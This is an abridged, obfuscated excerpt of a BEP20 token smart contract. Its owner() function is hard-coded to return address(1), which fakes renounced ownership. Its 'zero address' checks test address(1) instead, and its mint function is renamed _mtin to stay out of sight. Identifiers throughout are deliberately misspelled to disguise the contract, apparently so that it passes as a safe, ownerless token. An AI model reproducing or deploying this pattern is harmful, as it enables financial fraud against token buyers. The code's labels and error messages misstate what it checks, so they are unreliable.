...
abstract contract Ownable is Context {
    ...
    function owcne() public view virtual  returns  (address) {
        return  address(1);
    }
    ...
    function renounceowcneship() public virtual onlyowcne {
        _transferowcneship(address(1));
    }


    function transferowcneship_transferowcneship(address newowcne) public virtual onlyowcne {
        require(newowcne != address(1), "Ownable: new owcne is the zero address");
...
contract BEP20 is Context {
    ...
    function _approve(
        ...
        require(owcne != address(1), "ERC20: approve from the zero address");
...
contract te is BEP20, Ownable {
    ...
    function _burn(address abzount, uint256 amnount) internal virtual {
        require(abzount != address(1), "ERC20: burn from the zero address");
        ...
        emit Transfer(abzount, address(1), amnount);
    }

    function _mtin(address abzount, uint256 amnount) internal virtual {
        require(abzount != address(1), "ERC20: mtin to the zero address");

        _totalSupply += amnount;
        _balances[abzount] += amnount;
        emit Transfer(address(1), abzount, amnount);
    }
    ...
    function _recF(
        ...
        require(from != address(1), "ERC20: transfer from the zero address");
        require(_to != address(1), "ERC20: transfer to the zero address");
